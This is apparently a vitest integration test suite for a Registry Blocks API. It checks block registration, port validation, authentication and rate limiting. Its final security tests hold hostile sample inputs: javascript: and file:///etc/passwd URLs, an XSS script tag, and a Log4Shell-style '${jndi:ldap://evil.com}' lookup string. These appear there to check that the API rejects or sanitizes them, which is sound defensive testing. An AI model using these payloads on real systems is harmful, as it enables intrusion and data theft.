/**
 * Comprehensive Integration Tests for Registry Blocks API Endpoints
 *
 * This test suite provides thorough coverage for the Registry Blocks API including:
 * - CRUD operations (GET, POST) for dynamic block registration
 * - Authentication and authorization testing
 * - Input/Output port validation and manifest testing
 * - Execution URL validation and accessibility testing
 * - Rate limiting functionality specific to blocks
 * - Port conflict detection and logical consistency validation
 * - Performance and edge case scenarios
 * - Security considerations for custom block execution
 *
 * Dependencies: vitest, bun-compatible test infrastructure
 * Test Infrastructure: Uses enhanced-utils for consistent mock patterns
 *
 * Key Differences from Tools API:
 * - Block manifest includes input/output port definitions
 * - Execution URL validation instead of webhook validation
 * - Port name conflict detection and validation
 * - Lower rate limits due to execution complexity
 * - Additional validation for port schemas and data flow
 */

import { NextRequest } from 'next/server'
import { beforeEach, describe, expect, it, vi } from 'vitest'

// Import the new bun-compatible test infrastructure
import '@/app/api/__test-utils__/module-mocks'
import {
  createEnhancedMockRequest,
  setupEnhancedTestMocks,
} from '@/app/api/__test-utils__/enhanced-utils'
import { mockControls, mockUser } from '@/app/api/__test-utils__/module-mocks'
// Import the API endpoints under test
import { GET, POST } from './route'

/**
 * Sample block test data with comprehensive port definitions
 * Covers complex data flow scenarios and validation requirements
 */
const sampleBlockManifest = {
  inputPorts: [
    {
      name: 'input_data',
      type: 'object' as const,
      required: true,
      description: 'Primary input data for processing',
      schema: {
        type: 'object',
        properties: {
          text: { type: 'string' },
          metadata: { type: 'object' },
        },
        required: ['text'],
      },
    },
    {
      name: 'configuration',
      type: 'object' as const,
      required: false,
      description: 'Optional configuration parameters',
      schema: {
        type: 'object',
        properties: {
          language: { type: 'string', enum: ['en', 'es', 'fr'] },
          format: { type: 'string', enum: ['json', 'xml', 'yaml'] },
        },
      },
    },
  ],
  outputPorts: [
    {
      name: 'processed_data',
      type: 'object' as const,
      required: true,
      description: 'Processed output data',
      schema: {
        type: 'object',
        properties: {
          result: { type: 'string' },
          confidence: { type: 'number', minimum: 0, maximum: 1 },
          timestamp: { type: 'string', format: 'date-time' },
        },
        required: ['result', 'confidence'],
      },
    },
    {
      name: 'analytics',
      type: 'object' as const,
      required: false,
      description: 'Optional analytics and metrics',
      schema: {
        type: 'object',
        properties: {
          processingTime: { type: 'number' },
          wordCount: { type: 'number' },
          complexity: { type: 'string', enum: ['low', 'medium', 'high'] },
        },
      },
    },
  ],
  configSchema: {
    type: 'object' as const,
    properties: {
      apiEndpoint: {
        type: 'string',
        format: 'uri',
        description: 'Endpoint for external processing service',
      },
      timeout: {
        type: 'number',
        minimum: 1000,
        maximum: 300000,
        description: 'Processing timeout in milliseconds',
      },
      enableAnalytics: {
        type: 'boolean',
        description: 'Whether to generate analytics output',
      },
    },
    required: ['apiEndpoint'],
  },
}

const sampleBlockData = {
  name: 'custom_processor_block',
  displayName: 'Custom Data Processor Block',
  description: 'A custom block for advanced data processing workflows',
  icon: 'processor-icon',
  category: 'processing',
  version: '1.0.0',
  manifest: sampleBlockManifest,
  executionUrl: 'https://api.example.com/execute/processor',
  validationUrl: 'https://api.example.com/validate/processor',
  executionTimeout: 120000, // 2 minutes
  tags: ['processing', 'data-flow', 'custom'],
  metadata: {
    author: 'Block Developer',
    documentation: 'https://docs.example.com/processor-block',
    supportUrl: 'https://support.example.com',
    compatibility: ['workflow-v2', 'execution-engine-v3'],
  },
}

const registeredBlockResponse = {
  id: 'block_1234567890abcdef',
  userId: mockUser.id,
  name: sampleBlockData.name,
  displayName: sampleBlockData.displayName,
  description: sampleBlockData.description,
  icon: sampleBlockData.icon,
  category: sampleBlockData.category,
  version: sampleBlockData.version,
  status: 'active',
  manifest: sampleBlockManifest,
  inputPorts: sampleBlockManifest.inputPorts,
  outputPorts: sampleBlockManifest.outputPorts,
  configSchema: sampleBlockManifest.configSchema,
  executionUrl: sampleBlockData.executionUrl,
  validationUrl: sampleBlockData.validationUrl,
  executionTimeout: sampleBlockData.executionTimeout,
  usageCount: 0,
  lastUsedAt: null,
  errorCount: 0,
  lastErrorAt: null,
  lastErrorMessage: null,
  tags: sampleBlockData.tags,
  metadata: sampleBlockData.metadata,
  createdAt: new Date('2024-01-01T00:00:00.000Z'),
  updatedAt: new Date('2024-01-01T00:00:00.000Z'),
}

const sampleBlocksList = [
  registeredBlockResponse,
  {
    ...registeredBlockResponse,
    id: 'block_fedcba0987654321',
    name: 'analyzer_block',
    displayName: 'Data Analysis Block',
    description: 'Advanced analytics block for workflow insights',
    category: 'analytics',
    usageCount: 8,
    lastUsedAt: new Date('2024-01-12T15:45:00.000Z'),
    tags: ['analytics', 'insights'],
  },
]

/**
 * Mock fetch function for execution URL validation testing
 */
function mockFetchWithResponse(status = 200, ok = true) {
  global.fetch = vi.fn().mockResolvedValue({
    ok,
    status,
    headers: new Headers(),
    json: () => Promise.resolve({}),
  })
}

describe('Registry Blocks API - GET /api/registry/blocks', () => {
  let mocks: any

  beforeEach(() => {
    console.log('🧪 Setting up Registry Blocks GET tests with enhanced infrastructure')

    // Reset all mocks to clean state
    mockControls.reset()
    vi.clearAllMocks()

    // Setup enhanced test environment with bun compatibility
    mocks = setupEnhancedTestMocks({
      auth: { authenticated: true, user: mockUser },
      database: {
        select: { results: [sampleBlocksList, [{ count: 2 }]] },
      },
      permissions: { level: 'admin' },
    })

    console.log('✅ Registry Blocks GET test setup complete')
  })

  describe('Authentication and Authorization', () => {
    it('should return 401 when user is not authenticated', async () => {
      console.log('🧪 Testing unauthenticated access to GET /api/registry/blocks')

      // Setup unauthenticated user
      mocks.auth.setUnauthenticated()

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(401)
      const data = await response.json()
      expect(data.error.code).toBe('UNAUTHORIZED')
      expect(data.error.message).toBe('Authentication required')

      console.log('✅ Unauthenticated access properly rejected')
    })

    it('should authenticate with valid session', async () => {
      console.log('🧪 Testing authenticated access to GET /api/registry/blocks')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.blocks).toBeDefined()
      expect(data.pagination).toBeDefined()

      console.log('✅ Authenticated access successful')
    })
  })

  describe('Block Listing and Filtering', () => {
    it('should list blocks with default parameters', async () => {
      console.log('🧪 Testing block listing with default parameters')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.blocks).toEqual(sampleBlocksList)
      expect(data.pagination.total).toBe(2)
      expect(data.pagination.page).toBe(1)
      expect(data.pagination.limit).toBe(20)

      console.log('✅ Default block listing successful')
    })

    it('should filter blocks by category', async () => {
      console.log('🧪 Testing category filtering for blocks')

      const request = new NextRequest(
        'http://localhost:3000/api/registry/blocks?category=processing'
      )
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.blocks).toBeDefined()

      console.log('✅ Block category filtering successful')
    })

    it('should filter blocks by status', async () => {
      console.log('🧪 Testing status filtering for blocks')

      const request = new NextRequest('http://localhost:3000/api/registry/blocks?status=active')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.blocks).toBeDefined()

      console.log('✅ Block status filtering successful')
    })

    it('should search blocks by name and description', async () => {
      console.log('🧪 Testing text search functionality for blocks')

      const request = new NextRequest(
        'http://localhost:3000/api/registry/blocks?search=data%20processor'
      )
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.blocks).toBeDefined()

      console.log('✅ Block text search successful')
    })

    it('should include port information in block listings', async () => {
      console.log('🧪 Testing port information inclusion in listings')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()

      if (data.blocks.length > 0) {
        const block = data.blocks[0]
        expect(block).toHaveProperty('inputPorts')
        expect(block).toHaveProperty('outputPorts')
        expect(Array.isArray(block.inputPorts)).toBe(true)
        expect(Array.isArray(block.outputPorts)).toBe(true)
      }

      console.log('✅ Port information included in listings')
    })
  })

  describe('Input Validation and Error Handling', () => {
    it('should validate query parameters', async () => {
      console.log('🧪 Testing query parameter validation for blocks')

      const request = new NextRequest(
        'http://localhost:3000/api/registry/blocks?page=invalid&limit=abc'
      )
      const response = await GET(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')
      expect(data.error.message).toBe('Invalid query parameters')
      expect(data.error.details).toBeDefined()

      console.log('✅ Block query parameter validation successful')
    })

    it('should validate pagination limits for blocks', async () => {
      console.log('🧪 Testing pagination limit validation for blocks')

      const request = new NextRequest('http://localhost:3000/api/registry/blocks?limit=150')
      const response = await GET(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')

      console.log('✅ Block pagination limit validation successful')
    })

    it('should handle database errors gracefully', async () => {
      console.log('🧪 Testing database error handling for blocks')

      // Setup database error
      mockControls.setDatabaseResults([])
      const originalSelect = mocks.database.mockDb.select
      mocks.database.mockDb.select = vi.fn(() => {
        throw new Error('Database connection failed')
      })

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Block database error handled gracefully')
    })
  })

  describe('Response Format and Structure', () => {
    it('should return properly structured response with block-specific fields', async () => {
      console.log('🧪 Testing block response structure validation')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify response structure
      expect(data).toHaveProperty('blocks')
      expect(data).toHaveProperty('pagination')
      expect(Array.isArray(data.blocks)).toBe(true)

      // Verify pagination structure
      expect(data.pagination).toHaveProperty('page')
      expect(data.pagination).toHaveProperty('limit')
      expect(data.pagination).toHaveProperty('total')
      expect(data.pagination).toHaveProperty('totalPages')
      expect(data.pagination).toHaveProperty('hasNext')
      expect(data.pagination).toHaveProperty('hasPrev')

      console.log('✅ Block response structure validation successful')
    })

    it('should include all necessary block fields', async () => {
      console.log('🧪 Testing block field completeness')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()

      if (data.blocks.length > 0) {
        const block = data.blocks[0]

        // Verify essential block fields
        expect(block).toHaveProperty('id')
        expect(block).toHaveProperty('name')
        expect(block).toHaveProperty('displayName')
        expect(block).toHaveProperty('status')
        expect(block).toHaveProperty('usageCount')
        expect(block).toHaveProperty('errorCount')
        expect(block).toHaveProperty('inputPorts')
        expect(block).toHaveProperty('outputPorts')
        expect(block).toHaveProperty('tags')
        expect(block).toHaveProperty('createdAt')
        expect(block).toHaveProperty('updatedAt')
      }

      console.log('✅ Block field completeness verified')
    })
  })
})

describe('Registry Blocks API - POST /api/registry/blocks', () => {
  let mocks: any

  beforeEach(() => {
    console.log('🧪 Setting up Registry Blocks POST tests with enhanced infrastructure')

    // Reset all mocks to clean state
    mockControls.reset()
    vi.clearAllMocks()

    // Setup successful execution URL validation
    mockFetchWithResponse(200, true)

    mocks = setupEnhancedTestMocks({
      auth: { authenticated: true, user: mockUser },
      database: {
        select: { results: [[], [registeredBlockResponse]] }, // Empty for duplicate check, then insert result
        insert: { results: [registeredBlockResponse] },
        update: { results: [] }, // For rate limit update
      },
      permissions: { level: 'admin' },
    })

    // Setup enhanced database results
    mockControls.setDatabaseResults([
      [], // Duplicate check - no existing blocks
      [registeredBlockResponse], // Insert result
      [], // Rate limit update result
    ])

    console.log('✅ Registry Blocks POST test setup complete')
  })

  describe('Block Registration Success Cases', () => {
    it('should register a new block successfully with all fields', async () => {
      console.log('🧪 Testing successful block registration with complete data')

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.id).toBeDefined()
      expect(data.name).toBe(sampleBlockData.name)
      expect(data.displayName).toBe(sampleBlockData.displayName)
      expect(data.status).toBe('active')
      expect(data.createdAt).toBeDefined()
      expect(data.executionUrl).toBe(sampleBlockData.executionUrl)
      expect(data.inputPorts).toBe(sampleBlockManifest.inputPorts.length)
      expect(data.outputPorts).toBe(sampleBlockManifest.outputPorts.length)

      console.log('✅ Block registration successful')
    })

    it('should register block with minimal required data', async () => {
      console.log('🧪 Testing minimal block registration')

      const minimalBlockData = {
        name: 'minimal_block',
        displayName: 'Minimal Block',
        manifest: {
          inputPorts: [
            {
              name: 'input',
              type: 'string' as const,
              required: true,
              description: 'Simple input',
            },
          ],
          outputPorts: [
            {
              name: 'output',
              type: 'string' as const,
              required: true,
              description: 'Simple output',
            },
          ],
          configSchema: {
            type: 'object' as const,
            properties: {},
          },
        },
        executionUrl: 'https://api.example.com/execute/minimal',
      }

      const request = createEnhancedMockRequest('POST', minimalBlockData)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.name).toBe(minimalBlockData.name)
      expect(data.displayName).toBe(minimalBlockData.displayName)
      expect(data.inputPorts).toBe(1)
      expect(data.outputPorts).toBe(1)

      console.log('✅ Minimal block registration successful')
    })

    it('should handle optional validation URL', async () => {
      console.log('🧪 Testing block registration with optional validation URL')

      const blockWithValidation = {
        ...sampleBlockData,
        validationUrl: 'https://api.example.com/validate/processor',
      }

      const request = createEnhancedMockRequest('POST', blockWithValidation)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.id).toBeDefined()

      console.log('✅ Block with validation URL registered successfully')
    })

    it('should handle complex port configurations', async () => {
      console.log('🧪 Testing complex port configuration handling')

      const complexBlockData = {
        name: 'complex_ports_block',
        displayName: 'Complex Ports Block',
        manifest: {
          inputPorts: [
            {
              name: 'primary_input',
              type: 'object' as const,
              required: true,
              description: 'Primary data input',
              schema: {
                type: 'object',
                properties: {
                  data: { type: 'array', items: { type: 'string' } },
                  metadata: { type: 'object' },
                },
                required: ['data'],
              },
            },
            {
              name: 'optional_config',
              type: 'object' as const,
              required: false,
              description: 'Optional configuration',
            },
          ],
          outputPorts: [
            {
              name: 'results',
              type: 'array' as const,
              required: true,
              description: 'Processing results',
            },
            {
              name: 'metrics',
              type: 'object' as const,
              required: false,
              description: 'Performance metrics',
            },
          ],
          configSchema: {
            type: 'object' as const,
            properties: {
              processingMode: {
                type: 'string',
                enum: ['fast', 'accurate', 'balanced'],
              },
            },
          },
        },
        executionUrl: 'https://api.example.com/execute/complex',
      }

      const request = createEnhancedMockRequest('POST', complexBlockData)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.inputPorts).toBe(2)
      expect(data.outputPorts).toBe(2)

      console.log('✅ Complex port configuration handled successfully')
    })
  })

  describe('Authentication and Authorization', () => {
    it('should require authentication for block registration', async () => {
      console.log('🧪 Testing authentication requirement for block registration')

      mocks.auth.setUnauthenticated()

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(401)
      const data = await response.json()
      expect(data.error.code).toBe('UNAUTHORIZED')
      expect(data.error.message).toBe('Authentication required')

      console.log('✅ Authentication requirement enforced for blocks')
    })
  })

  describe('Input Validation', () => {
    it('should validate required name field', async () => {
      console.log('🧪 Testing required name field validation for blocks')

      const invalidBlockData = {
        ...sampleBlockData,
        name: '',
      }

      const request = createEnhancedMockRequest('POST', invalidBlockData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')
      expect(data.error.message).toBe('Invalid block data')

      console.log('✅ Required name field validation successful for blocks')
    })

    it('should validate name format restrictions', async () => {
      console.log('🧪 Testing name format validation for blocks')

      const invalidNames = [
        'Invalid Name', // spaces not allowed
        'invalid-name', // hyphens not allowed
        'INVALID_NAME', // uppercase not allowed
        '123invalid', // cannot start with number
        'invalid.name', // dots not allowed
      ]

      for (const invalidName of invalidNames) {
        const invalidBlockData = {
          ...sampleBlockData,
          name: invalidName,
        }

        const request = createEnhancedMockRequest('POST', invalidBlockData)
        const response = await POST(request)

        expect(response.status).toBe(400)
        const data = await response.json()
        expect(data.error.code).toBe('VALIDATION_ERROR')
      }

      console.log('✅ Name format validation successful for blocks')
    })

    it('should validate execution URL format', async () => {
      console.log('🧪 Testing execution URL validation for blocks')

      const invalidUrls = [
        'not-a-url',
        'ftp://example.com', // Only HTTP/HTTPS allowed
        'http://localhost', // May not be accessible
        '',
      ]

      for (const invalidUrl of invalidUrls) {
        const invalidBlockData = {
          ...sampleBlockData,
          executionUrl: invalidUrl,
        }

        const request = createEnhancedMockRequest('POST', invalidBlockData)
        const response = await POST(request)

        expect(response.status).toBe(400)
      }

      console.log('✅ Execution URL format validation successful')
    })

    it('should validate execution timeout ranges', async () => {
      console.log('🧪 Testing execution timeout validation')

      const invalidTimeouts = [
        500, // Too low (minimum 1000ms)
        700000, // Too high (maximum 600000ms)
        -5000, // Negative values
      ]

      for (const invalidTimeout of invalidTimeouts) {
        const invalidBlockData = {
          ...sampleBlockData,
          executionTimeout: invalidTimeout,
        }

        const request = createEnhancedMockRequest('POST', invalidBlockData)
        const response = await POST(request)

        expect(response.status).toBe(400)
      }

      console.log('✅ Execution timeout validation successful')
    })
  })

  describe('Port and Manifest Validation', () => {
    it('should validate port schema structure', async () => {
      console.log('🧪 Testing port schema structure validation')

      const invalidManifests = [
        // Missing inputPorts
        {
          outputPorts: [{ name: 'output', type: 'string', required: true }],
          configSchema: { type: 'object', properties: {} },
        },
        // Missing outputPorts
        {
          inputPorts: [{ name: 'input', type: 'string', required: true }],
          configSchema: { type: 'object', properties: {} },
        },
        // Missing configSchema
        {
          inputPorts: [{ name: 'input', type: 'string', required: true }],
          outputPorts: [{ name: 'output', type: 'string', required: true }],
        },
      ]

      for (const invalidManifest of invalidManifests) {
        const invalidBlockData = {
          ...sampleBlockData,
          manifest: invalidManifest as any,
        }

        const request = createEnhancedMockRequest('POST', invalidBlockData)
        const response = await POST(request)

        expect(response.status).toBe(400)
      }

      console.log('✅ Port schema structure validation successful')
    })

    it('should detect duplicate port names within inputs', async () => {
      console.log('🧪 Testing duplicate input port name detection')

      const invalidBlockData = {
        ...sampleBlockData,
        manifest: {
          inputPorts: [
            { name: 'input', type: 'string' as const, required: true, description: 'First' },
            { name: 'input', type: 'number' as const, required: false, description: 'Duplicate' },
          ],
          outputPorts: [
            { name: 'output', type: 'string' as const, required: true, description: 'Result' },
          ],
          configSchema: { type: 'object' as const, properties: {} },
        },
      }

      const request = createEnhancedMockRequest('POST', invalidBlockData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('INVALID_MANIFEST')
      expect(data.error.details).toContain('Duplicate input port names')

      console.log('✅ Duplicate input port name detection successful')
    })

    it('should detect duplicate port names within outputs', async () => {
      console.log('🧪 Testing duplicate output port name detection')

      const invalidBlockData = {
        ...sampleBlockData,
        manifest: {
          inputPorts: [
            { name: 'input', type: 'string' as const, required: true, description: 'Input' },
          ],
          outputPorts: [
            { name: 'result', type: 'string' as const, required: true, description: 'First' },
            { name: 'result', type: 'object' as const, required: false, description: 'Duplicate' },
          ],
          configSchema: { type: 'object' as const, properties: {} },
        },
      }

      const request = createEnhancedMockRequest('POST', invalidBlockData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('INVALID_MANIFEST')
      expect(data.error.details).toContain('Duplicate output port names')

      console.log('✅ Duplicate output port name detection successful')
    })

    it('should detect port name conflicts between inputs and outputs', async () => {
      console.log('🧪 Testing port name conflicts between inputs and outputs')

      const invalidBlockData = {
        ...sampleBlockData,
        manifest: {
          inputPorts: [
            { name: 'data', type: 'string' as const, required: true, description: 'Input data' },
          ],
          outputPorts: [
            { name: 'data', type: 'object' as const, required: true, description: 'Output data' },
          ],
          configSchema: { type: 'object' as const, properties: {} },
        },
      }

      const request = createEnhancedMockRequest('POST', invalidBlockData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('INVALID_MANIFEST')
      expect(data.error.details).toContain('Port names conflict between inputs and outputs')

      console.log('✅ Port name conflict detection successful')
    })

    it('should require at least one input or output port', async () => {
      console.log('🧪 Testing minimum port requirement')

      const invalidBlockData = {
        ...sampleBlockData,
        manifest: {
          inputPorts: [],
          outputPorts: [],
          configSchema: { type: 'object' as const, properties: {} },
        },
      }

      const request = createEnhancedMockRequest('POST', invalidBlockData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('INVALID_MANIFEST')
      expect(data.error.details).toContain('at least one input or output port')

      console.log('✅ Minimum port requirement validation successful')
    })

    it('should validate port limits', async () => {
      console.log('🧪 Testing port number limits')

      // Create block with too many ports (over 20 limit)
      const tooManyPorts = Array.from({ length: 25 }, (_, i) => ({
        name: `port_${i}`,
        type: 'string' as const,
        required: false,
        description: `Port ${i}`,
      }))

      const invalidBlockData = {
        ...sampleBlockData,
        manifest: {
          inputPorts: tooManyPorts,
          outputPorts: [
            { name: 'output', type: 'string' as const, required: true, description: 'Result' },
          ],
          configSchema: { type: 'object' as const, properties: {} },
        },
      }

      const request = createEnhancedMockRequest('POST', invalidBlockData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')

      console.log('✅ Port limits validation successful')
    })
  })

  describe('Business Logic Validation', () => {
    it('should prevent duplicate block names for same user', async () => {
      console.log('🧪 Testing duplicate block name prevention')

      // Setup existing block with same name
      mockControls.setDatabaseResults([
        [{ id: 'existing-block-id' }], // Duplicate check - found existing
      ])

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(409)
      const data = await response.json()
      expect(data.error.code).toBe('DUPLICATE_NAME')
      expect(data.error.message).toContain(sampleBlockData.name)

      console.log('✅ Duplicate block name prevention successful')
    })

    it('should validate execution URL accessibility', async () => {
      console.log('🧪 Testing execution URL accessibility validation')

      // Mock failed execution URL validation
      mockFetchWithResponse(404, false)

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('EXECUTION_URL_VALIDATION_FAILED')
      expect(data.error.message).toBe('Execution URL is not accessible or invalid')

      console.log('✅ Execution URL accessibility validation successful')
    })

    it('should validate optional validation URL accessibility', async () => {
      console.log('🧪 Testing optional validation URL accessibility')

      // Setup block with validation URL
      const blockWithValidation = {
        ...sampleBlockData,
        validationUrl: 'https://api.example.com/validate/processor',
      }

      // Mock successful execution URL but failed validation URL
      global.fetch = vi
        .fn()
        .mockResolvedValueOnce({ ok: true, status: 200 }) // Execution URL success
        .mockResolvedValueOnce({ ok: false, status: 404 }) // Validation URL failure

      mockControls.setDatabaseResults([
        [], // No duplicates
      ])

      const request = createEnhancedMockRequest('POST', blockWithValidation)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_URL_VALIDATION_FAILED')
      expect(data.error.message).toBe('Validation URL is not accessible or invalid')

      console.log('✅ Validation URL accessibility validation successful')
    })
  })

  describe('Rate Limiting', () => {
    it('should enforce rate limiting for block registrations', async () => {
      console.log('🧪 Testing rate limiting enforcement for blocks')

      // Setup rate limit exceeded scenario (10 blocks per hour limit)
      mockControls.setDatabaseResults([
        [
          {
            userId: mockUser.id,
            blockRegistrations: 12, // Over the limit of 10
            windowStart: new Date(),
            lastRequestAt: new Date(),
            isRateLimited: false,
          },
        ], // Rate limit check
      ])

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(429)
      const data = await response.json()
      expect(data.error.code).toBe('RATE_LIMIT_EXCEEDED')
      expect(data.error.message).toContain('rate limit exceeded')

      console.log('✅ Block rate limiting enforcement successful')
    })

    it('should have lower rate limits than tools due to complexity', async () => {
      console.log('🧪 Testing lower rate limits for blocks vs tools')

      // Verify that blocks have lower rate limits (10 vs 20 for tools)
      // This is implemented in the checkBlockRateLimit function
      // The test ensures the limit is correctly applied

      // Setup scenario with 11 registrations (over block limit but under tool limit)
      mockControls.setDatabaseResults([
        [
          {
            userId: mockUser.id,
            blockRegistrations: 11, // Over block limit (10) but under tool limit (20)
            windowStart: new Date(),
            lastRequestAt: new Date(),
            isRateLimited: false,
          },
        ],
      ])

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(429)
      const data = await response.json()
      expect(data.error.code).toBe('RATE_LIMIT_EXCEEDED')

      console.log('✅ Lower rate limits for blocks confirmed')
    })

    it('should reset rate limit window after expiry', async () => {
      console.log('🧪 Testing block rate limit window reset')

      // Setup expired rate limit window (older than 60 minutes)
      const oldDate = new Date(Date.now() - 61 * 60 * 1000) // 61 minutes ago
      mockControls.setDatabaseResults([
        [
          {
            userId: mockUser.id,
            blockRegistrations: 15, // Over limit but expired
            windowStart: oldDate,
            lastRequestAt: oldDate,
            isRateLimited: true,
          },
        ], // Rate limit check - expired window
        [], // Duplicate check
        [registeredBlockResponse], // Insert result
        [], // Rate limit update
      ])

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.id).toBeDefined()

      console.log('✅ Block rate limit window reset successful')
    })
  })

  describe('Error Handling and Edge Cases', () => {
    it('should handle malformed JSON gracefully', async () => {
      console.log('🧪 Testing malformed JSON handling for blocks')

      const request = new NextRequest('http://localhost:3000/api/registry/blocks', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid-json-content',
      })

      const response = await POST(request)

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Malformed JSON handled gracefully for blocks')
    })

    it('should handle database insertion errors for blocks', async () => {
      console.log('🧪 Testing database insertion error handling for blocks')

      // Setup database error
      mockControls.setDatabaseResults([
        [], // Duplicate check - none found
        [], // Insert fails with empty result
      ])

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Database insertion error handled gracefully for blocks')
    })

    it('should handle network errors during execution URL validation', async () => {
      console.log('🧪 Testing network error handling during execution URL validation')

      // Mock network error
      global.fetch = vi.fn().mockRejectedValue(new Error('Network error'))

      const request = createEnhancedMockRequest('POST', sampleBlockData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('EXECUTION_URL_VALIDATION_FAILED')

      console.log('✅ Network error handling successful for blocks')
    })

    it('should handle extremely large port definitions', async () => {
      console.log('🧪 Testing handling of extremely large port definitions')

      const largeSchema = {
        type: 'object',
        properties: Object.fromEntries(
          Array.from({ length: 100 }, (_, i) => [
            `property_${i}`,
            { type: 'string', description: 'a'.repeat(200) },
          ])
        ),
      }

      const blockWithLargeSchema = {
        ...sampleBlockData,
        manifest: {
          inputPorts: [
            {
              name: 'large_input',
              type: 'object' as const,
              required: true,
              description: 'Input with large schema',
              schema: largeSchema,
            },
          ],
          outputPorts: [
            {
              name: 'output',
              type: 'object' as const,
              required: true,
              description: 'Simple output',
            },
          ],
          configSchema: { type: 'object' as const, properties: {} },
        },
      }

      const request = createEnhancedMockRequest('POST', blockWithLargeSchema)
      const response = await POST(request)

      // Should either accept or reject gracefully
      expect([201, 400]).toContain(response.status)

      console.log('✅ Large port definitions handled gracefully')
    })
  })

  describe('Security Considerations', () => {
    it('should validate against malicious execution URLs', async () => {
      console.log('🧪 Testing malicious execution URL handling')

      const maliciousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
        'http://localhost:22/ssh-attack',
      ]

      for (const maliciousUrl of maliciousUrls) {
        const blockWithMaliciousUrl = {
          ...sampleBlockData,
          executionUrl: maliciousUrl,
        }

        const request = createEnhancedMockRequest('POST', blockWithMaliciousUrl)
        const response = await POST(request)

        // Should reject malicious URLs
        expect(response.status).toBe(400)
      }

      console.log('✅ Malicious execution URL handling successful')
    })

    it('should sanitize port descriptions and schemas', async () => {
      console.log('🧪 Testing port description and schema sanitization')

      const blockWithUnsafeContent = {
        ...sampleBlockData,
        manifest: {
          inputPorts: [
            {
              name: 'unsafe_input',
              type: 'object' as const,
              required: true,
              description: '<script>alert("xss")</script>Malicious description',
              schema: {
                type: 'object',
                properties: {
                  data: {
                    type: 'string',
                    description: '${jndi:ldap://evil.com}',
                  },
                },
              },
            },
          ],
          outputPorts: [
            {
              name: 'output',
              type: 'string' as const,
              required: true,
              description: 'Clean output',
            },
          ],
          configSchema: { type: 'object' as const, properties: {} },
        },
      }

      const request = createEnhancedMockRequest('POST', blockWithUnsafeContent)
      const response = await POST(request)

      // Should either sanitize content or reject
      expect([201, 400]).toContain(response.status)

      console.log('✅ Port description and schema sanitization handled')
    })
  })
})
